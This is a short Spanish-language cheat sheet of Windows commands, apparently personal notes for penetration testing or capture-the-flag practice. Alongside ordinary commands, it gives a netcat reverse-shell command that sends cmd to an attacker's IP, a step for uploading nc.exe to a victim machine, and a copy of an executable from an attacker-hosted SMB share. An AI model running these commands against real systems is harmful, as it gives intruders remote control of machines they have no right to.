# Comandos Windows ❮❯

Tags: #Windows #Comandos

**C:\Windows\Temp** Directorio en donde tenemos capacidad de escritura y lectura

❯ **ipconfig** Nos muestra las interfaces y las direcciones IP

❯ **cls** Nos ayuda a limpiar la pantalla
❯ **dir** Nos muestra el contenido del directorio
	❯ **dir /r /s ❮File.txt❯ Buscamos de forma recursiva el string .txt
❯ **type ❮File❯** Nos muestra el contenido del archivo
❯ **cd ❮Path❯ Nos cambia de directorio (**C:\\Users\\**)
❯ **ipconfig** Nos reportara las interfaces y sus IP's
❯ **upload ❮Path/nc.exe❯** Para subir el archivo Netcat desde la maquina victima

❯ **nc.exe -e cmd ❮IP Atacante❯ ❮Port❯** Para ejecutar el netcat y nos haga una ReverShell a nuestra IP y puerto especifico
❯ **netstat -nat** Miramos los puertos abiertos
❯ **services** Para ver los servicios que estan corriendo en Windows 
❯ **mkdir ❮Name❯** Nos creamos un directorio con un nombre especifico
❯ **copy \❮Nuestra IP❯\\❮Folder_name❯\\❮File.exe❯ ❮File.exe❯** Nos copiamos un archivo .exe desde un recurso compartido SMB que se encuentra en nuestra maquina de atacante
